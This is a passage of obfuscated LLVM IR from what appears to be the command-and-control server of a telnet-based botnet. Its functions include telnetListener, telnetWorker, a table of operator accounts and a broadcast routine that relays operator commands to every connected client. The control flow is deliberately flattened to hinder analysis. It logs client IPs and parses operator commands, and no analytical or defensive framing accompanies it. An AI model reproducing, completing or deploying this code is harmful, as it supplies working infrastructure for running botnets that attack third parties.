  %2162 = select i1 %2161, i32 256016814, i32 857097256
  store i32 %2162, i32* %switchVar
  br label %loopEnd

; <label>:2163:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2164:                                   ; preds = %loopEntry
  store i32 1705657385, i32* %switchVar
  br label %loopEnd

; <label>:2165:                                   ; preds = %loopEntry
  %2166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2167 = call i8* @strstr(i8* %2166, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0)) #8
  %2168 = icmp ne i8* %2167, null
  %2169 = select i1 %2168, i32 -1384375202, i32 -1976558769
  store i32 %2169, i32* %switchVar
  br label %loopEnd

; <label>:2170:                                   ; preds = %loopEntry
  %2171 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2172 = call i32 (i8*, i8*, ...) @sprintf(i8* %2171, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i32 0, i32 0)) #7
  %2173 = load i32, i32* %4, align 4
  %2174 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2176 = call i64 @strlen(i8* %2175) #8
  %2177 = call i64 @send(i32 %2173, i8* %2174, i64 %2176, i32 16384)
  %2178 = icmp eq i64 %2177, -1
  %2179 = select i1 %2178, i32 -1226511829, i32 524677046
  store i32 %2179, i32* %switchVar
  br label %loopEnd

; <label>:2180:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2181:                                   ; preds = %loopEntry
  store i32 -1976558769, i32* %switchVar
  br label %loopEnd

; <label>:2182:                                   ; preds = %loopEntry
  %2183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2184 = call i8* @strstr(i8* %2183, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i32 0, i32 0)) #8
  %2185 = icmp ne i8* %2184, null
  %2186 = select i1 %2185, i32 -1536718226, i32 -1855879044
  store i32 %2186, i32* %switchVar
  br label %loopEnd

; <label>:2187:                                   ; preds = %loopEntry
  %2188 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2189 = call i32 (i8*, i8*, ...) @sprintf(i8* %2188, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i32 0, i32 0)) #7
  %2190 = load i32, i32* %4, align 4
  %2191 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2193 = call i64 @strlen(i8* %2192) #8
  %2194 = call i64 @send(i32 %2190, i8* %2191, i64 %2193, i32 16384)
  %2195 = icmp eq i64 %2194, -1
  %2196 = select i1 %2195, i32 -421518672, i32 -746056423
  store i32 %2196, i32* %switchVar
  br label %loopEnd

; <label>:2197:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2198:                                   ; preds = %loopEntry
  store i32 -1855879044, i32* %switchVar
  br label %loopEnd

; <label>:2199:                                   ; preds = %loopEntry
  %2200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2201 = call i8* @strstr(i8* %2200, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0)) #8
  %2202 = icmp ne i8* %2201, null
  %2203 = select i1 %2202, i32 -2043980716, i32 1881465558
  store i32 %2203, i32* %switchVar
  br label %loopEnd

; <label>:2204:                                   ; preds = %loopEntry
  %2205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2206 = call i32 (i8*, i8*, ...) @sprintf(i8* %2205, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i32 0, i32 0)) #7
  %2207 = load i32, i32* %4, align 4
  %2208 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2210 = call i64 @strlen(i8* %2209) #8
  %2211 = call i64 @send(i32 %2207, i8* %2208, i64 %2210, i32 16384)
  %2212 = icmp eq i64 %2211, -1
  %2213 = select i1 %2212, i32 1388687615, i32 1103300997
  store i32 %2213, i32* %switchVar
  br label %loopEnd

; <label>:2214:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2215:                                   ; preds = %loopEntry
  store i32 1881465558, i32* %switchVar
  br label %loopEnd

; <label>:2216:                                   ; preds = %loopEntry
  %2217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2218 = call i8* @strstr(i8* %2217, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0)) #8
  %2219 = icmp ne i8* %2218, null
  %2220 = select i1 %2219, i32 -477752699, i32 399173771
  store i32 %2220, i32* %switchVar
  br label %loopEnd

; <label>:2221:                                   ; preds = %loopEntry
  %2222 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2223 = call i32 (i8*, i8*, ...) @sprintf(i8* %2222, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i32 0, i32 0)) #7
  %2224 = load i32, i32* %4, align 4
  %2225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2227 = call i64 @strlen(i8* %2226) #8
  %2228 = call i64 @send(i32 %2224, i8* %2225, i64 %2227, i32 16384)
  %2229 = icmp eq i64 %2228, -1
  %2230 = select i1 %2229, i32 -1225977809, i32 -379791128
  store i32 %2230, i32* %switchVar
  br label %loopEnd

; <label>:2231:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2232:                                   ; preds = %loopEntry
  store i32 399173771, i32* %switchVar
  br label %loopEnd

; <label>:2233:                                   ; preds = %loopEntry
  %2234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2235 = call i8* @strstr(i8* %2234, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i32 0, i32 0)) #8
  %2236 = icmp ne i8* %2235, null
  %2237 = select i1 %2236, i32 704068582, i32 -504349321
  store i32 %2237, i32* %switchVar
  br label %loopEnd

; <label>:2238:                                   ; preds = %loopEntry
  store i32 -310015403, i32* %switchVar
  br label %loopEnd

; <label>:2239:                                   ; preds = %loopEntry
  %2240 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2241 = call i8* @strstr(i8* %2240, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i32 0, i32 0)) #8
  %2242 = icmp ne i8* %2241, null
  %2243 = select i1 %2242, i32 -1728467054, i32 -445661744
  store i32 %2243, i32* %switchVar
  br label %loopEnd

; <label>:2244:                                   ; preds = %loopEntry
  store i32 -310015403, i32* %switchVar
  br label %loopEnd

; <label>:2245:                                   ; preds = %loopEntry
  %2246 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2247 = call i8* @strstr(i8* %2246, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i32 0, i32 0)) #8
  %2248 = icmp ne i8* %2247, null
  %2249 = select i1 %2248, i32 1324042682, i32 -1320764758
  store i32 %2249, i32* %switchVar
  br label %loopEnd

; <label>:2250:                                   ; preds = %loopEntry
  store i32 -310015403, i32* %switchVar
  br label %loopEnd

; <label>:2251:                                   ; preds = %loopEntry
  %2252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2253 = call i8* @strstr(i8* %2252, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i32 0, i32 0)) #8
  %2254 = icmp ne i8* %2253, null
  %2255 = select i1 %2254, i32 -1746026920, i32 1634279010
  store i32 %2255, i32* %switchVar
  br label %loopEnd

; <label>:2256:                                   ; preds = %loopEntry
  store i32 -310015403, i32* %switchVar
  br label %loopEnd

; <label>:2257:                                   ; preds = %loopEntry
  %2258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2259 = call i8* @strstr(i8* %2258, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i32 0, i32 0)) #8
  %2260 = icmp ne i8* %2259, null
  %2261 = select i1 %2260, i32 -1635427377, i32 -602228865
  store i32 %2261, i32* %switchVar
  br label %loopEnd

; <label>:2262:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:2263:                                   ; preds = %loopEntry
  %2264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2265 = call i8* @strstr(i8* %2264, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i32 0, i32 0)) #8
  %2266 = icmp ne i8* %2265, null
  %2267 = select i1 %2266, i32 1099334476, i32 -1972265050
  store i32 %2267, i32* %switchVar
  br label %loopEnd

; <label>:2268:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:2269:                                   ; preds = %loopEntry
  %2270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %2270)
  %2271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2272 = load i32, i32* %5, align 4
  %2273 = sext i32 %2272 to i64
  %2274 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2273
  %2275 = getelementptr inbounds %struct.account, %struct.account* %2274, i32 0, i32 0
  %2276 = getelementptr inbounds [20 x i8], [20 x i8]* %2275, i32 0, i32 0
  %2277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2278 = call i32 (i8*, i8*, ...) @sprintf(i8* %2271, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %2276, i8* %2277) #7
  %2279 = load i32, i32* %4, align 4
  %2280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2282 = call i64 @strlen(i8* %2281) #8
  %2283 = call i64 @send(i32 %2279, i8* %2280, i64 %2282, i32 16384)
  %2284 = icmp eq i64 %2283, -1
  %2285 = select i1 %2284, i32 397630595, i32 -1521499086
  store i32 %2285, i32* %switchVar
  br label %loopEnd

; <label>:2286:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:2287:                                   ; preds = %loopEntry
  %2288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2289 = call i64 @strlen(i8* %2288) #8
  %2290 = icmp eq i64 %2289, 0
  %2291 = select i1 %2290, i32 1036124288, i32 -845320296
  store i32 %2291, i32* %switchVar
  br label %loopEnd

; <label>:2292:                                   ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:2293:                                   ; preds = %loopEntry
  %2294 = load i32, i32* %5, align 4
  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2295
  %2297 = getelementptr inbounds %struct.account, %struct.account* %2296, i32 0, i32 0
  %2298 = getelementptr inbounds [20 x i8], [20 x i8]* %2297, i32 0, i32 0
  %2299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2300 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2298, i8* %2299)
  %2301 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2301, %struct._IO_FILE** %111, align 8
  %2302 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2303 = load i32, i32* %5, align 4
  %2304 = sext i32 %2303 to i64
  %2305 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2304
  %2306 = getelementptr inbounds %struct.account, %struct.account* %2305, i32 0, i32 0
  %2307 = getelementptr inbounds [20 x i8], [20 x i8]* %2306, i32 0, i32 0
  %2308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2309 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2302, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2307, i8* %2308)
  %2310 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2311 = call i32 @fclose(%struct._IO_FILE* %2310)
  %2312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2313 = load i32, i32* %4, align 4
  %2314 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %2312, i32 %2313, i8* %2314)
  %2315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2315, i8 0, i64 2048, i32 16, i1 false)
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:2316:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:2317:                                   ; preds = %loopEntry
  %2318 = load i32, i32* %4, align 4
  %2319 = sext i32 %2318 to i64
  %2320 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2319
  %2321 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2320, i32 0, i32 1
  store i32 0, i32* %2321, align 4
  %2322 = load i32, i32* %4, align 4
  %2323 = call i32 @close(i32 %2322)
  %2324 = load volatile i32, i32* @managesConnected, align 4
  %2325 = add nsw i32 %2324, -1
  store volatile i32 %2325, i32* @managesConnected, align 4
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2326:                                   ; preds = %loopEntry
  %2327 = load i8*, i8** %2, align 8
  ret i8* %2327

loopEnd:                                          ; preds = %2317, %2316, %2293, %2292, %2287, %2286, %2269, %2268, %2263, %2262, %2257, %2256, %2251, %2250, %2245, %2244, %2239, %2238, %2233, %2232, %2231, %2221, %2216, %2215, %2214, %2204, %2199, %2198, %2197, %2187, %2182, %2181, %2180, %2170, %2165, %2164, %2163, %2153, %2148, %2147, %2146, %2136, %2131, %2130, %2129, %2119, %2114, %2113, %2112, %2102, %2097, %2096, %2095, %2085, %2080, %2079, %2078, %2068, %2063, %2062, %2061, %2035, %2030, %2025, %2024, %2023, %2013, %2008, %2007, %2006, %1996, %1991, %1990, %1989, %1979, %1974, %1973, %1972, %1962, %1957, %1956, %1955, %1945, %1940, %1939, %1938, %1928, %1923, %1922, %1921, %1911, %1906, %1905, %1904, %1894, %1889, %1888, %1887, %1877, %1872, %1871, %1870, %1860, %1855, %1854, %1853, %1843, %1838, %1837, %1836, %1826, %1821, %1820, %1819, %1809, %1804, %1803, %1802, %1792, %1787, %1786, %1785, %1775, %1770, %1769, %1768, %1767, %1757, %1756, %1755, %1720, %1710, %1705, %1700, %1699, %1698, %1697, %1687, %1686, %1685, %1665, %1655, %1650, %1645, %1644, %1643, %1633, %1628, %1627, %1626, %1616, %1611, %1610, %1609, %1599, %1594, %1589, %1570, %1565, %1560, %1541, %1536, %1517, %1512, %1511, %1510, %1509, %1493, %1490, %1489, %1481, %1480, %1472, %1471, %1463, %1462, %1454, %1453, %1445, %1444, %1436, %1435, %1427, %1426, %1400, %1395, %1390, %1385, %1380, %1375, %1374, %1373, %1372, %1356, %1353, %1352, %1344, %1343, %1335, %1334, %1326, %1325, %1317, %1316, %1308, %1307, %1299, %1298, %1290, %1289, %1281, %1280, %1272, %1271, %1263, %1262, %1254, %1253, %1245, %1244, %1236, %1235, %1227, %1226, %1218, %1217, %1209, %1208, %1200, %1199, %1191, %1190, %1182, %1181, %1173, %1172, %1164, %1163, %1155, %1154, %1098, %1093, %1088, %1083, %1082, %1081, %1080, %1064, %1061, %1060, %1052, %1051, %1043, %1042, %1034, %1033, %1025, %1024, %1004, %999, %994, %989, %984, %979, %978, %977, %976, %960, %957, %956, %948, %947, %939, %938, %930, %929, %921, %920, %912, %911, %903, %902, %894, %893, %885, %884, %876, %875, %867, %866, %858, %857, %825, %820, %815, %810, %805, %804, %803, %802, %786, %783, %782, %774, %773, %765, %764, %756, %755, %747, %746, %738, %737, %729, %728, %720, %719, %693, %688, %683, %678, %673, %672, %671, %670, %654, %651, %650, %642, %641, %633, %632, %624, %623, %615, %614, %606, %605, %597, %596, %574, %569, %564, %559, %554, %553, %552, %551, %535, %532, %531, %523, %522, %514, %513, %505, %504, %496, %495, %487, %486, %478, %477, %469, %468, %460, %459, %451, %450, %442, %441, %411, %406, %401, %396, %395, %394, %382, %377, %372, %367, %362, %356, %349, %348, %347, %331, %330, %329, %321, %320, %312, %311, %303, %302, %291, %290, %285, %284, %277, %275, %274, %266, %265, %257, %256, %238, %237, %235, %234, %223, %222, %216, %215, %205, %188, %187, %181, %180, %170, %169, %159, %139, %133, %131, %126, %120, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

declare i32 @resolve(...) #1

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -172007832, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -172007832, label %first
    i32 -441099678, label %15
    i32 1106655827, label %16
    i32 1653655301, label %30
    i32 -1114406549, label %31
    i32 1224373703, label %34
    i32 1105171678, label %71
    i32 2131779605, label %72
    i32 -600391234, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp slt i32 %.reload, 0
  %14 = select i1 %13, i32 -441099678, i32 1106655827
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i32 0, i32 0))
  store i32 1106655827, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %20 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i32 0, i32 0
  store i32 0, i32* %20, align 4
  %21 = load i32, i32* %3, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #9
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %4, align 4
  %26 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %27 = call i32 @bind(i32 %25, %struct.sockaddr* %26, i32 16) #7
  %28 = icmp slt i32 %27, 0
  %29 = select i1 %28, i32 1653655301, i32 -1114406549
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i32 0, i32 0))
  store i32 -1114406549, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %4, align 4
  %33 = call i32 @listen(i32 %32, i32 5) #7
  store i32 16, i32* %6, align 4
  store i32 1224373703, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i32 0, i32 0))
  %36 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %36, i32 0, i32 0
  %38 = load i64, i64* %37, align 4
  %39 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %36, i32 0, i32 1
  %40 = load i64, i64* %39, align 4
  call void @client_addr(i64 %38, i64 %40)
  %41 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %41, %struct._IO_FILE** %9, align 8
  %42 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %44 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  %46 = and i32 %45, 255
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = and i32 %49, 65280
  %51 = lshr i32 %50, 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 4
  %55 = and i32 %54, 16711680
  %56 = lshr i32 %55, 16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %58 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = and i32 %59, -16777216
  %61 = lshr i32 %60, 24
  %62 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %42, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i32 0, i32 0), i32 %46, i32 %51, i32 %56, i32 %61)
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %64 = call i32 @fclose(%struct._IO_FILE* %63)
  %65 = load i32, i32* %4, align 4
  %66 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %67 = call i32 @accept(i32 %65, %struct.sockaddr* %66, i32* %6)
  store i32 %67, i32* %5, align 4
  %68 = load i32, i32* %5, align 4
  %69 = icmp slt i32 %68, 0
  %70 = select i1 %69, i32 1105171678, i32 2131779605
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i32 0, i32 0))
  store i32 2131779605, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = sext i32 %73 to i64
  %75 = inttoptr i64 %74 to i8*
  %76 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %75) #7
  store i32 1224373703, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8*, i8** %2, align 8
  ret i8* %78

loopEnd:                                          ; preds = %72, %71, %34, %31, %30, %16, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %.reg2mem2 = alloca i64*
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -439638438, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -439638438, label %first
    i32 -1535509506, label %17
    i32 1224505443, label %23
    i32 -2087036505, label %35
    i32 979885591, label %37
    i32 577234646, label %41
    i32 525353760, label %43
    i32 1678609103, label %44
    i32 423529189, label %53
    i32 972057270, label %54
    i32 -1197030190, label %60
    i32 144386018, label %61
    i32 134800795, label %67
    i32 -290911186, label %68
    i32 -1528375178, label %73
    i32 -586307752, label %74
    i32 -1992806374, label %85
    i32 -1165350281, label %86
    i32 845009327, label %92
    i32 -1503284932, label %97
    i32 -1603230701, label %103
    i32 833997524, label %109
    i32 1452906619, label %110
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp ne i32 %.reload, 4
  %16 = select i1 %15, i32 -1535509506, i32 1224505443
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i32 0, i32 0), i8* %21)
  call void @exit(i32 1) #10
  unreachable

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = icmp sgt i32 %32, 1000
  %34 = select i1 %33, i32 -2087036505, i32 979885591
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.214, i32 0, i32 0))
  ret i32 0

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %9, align 4
  %39 = icmp slt i32 %38, 1000
  %40 = select i1 %39, i32 577234646, i32 525353760
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0))
  store i32 525353760, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1678609103, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.215, i32 0, i32 0))
  %46 = load i8**, i8*** %6, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @create_and_bind(i8* %48)
  store volatile i32 %49, i32* @listenFD, align 4
  %50 = load volatile i32, i32* @listenFD, align 4
  %51 = icmp eq i32 %50, -1
  %52 = select i1 %51, i32 423529189, i32 972057270
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

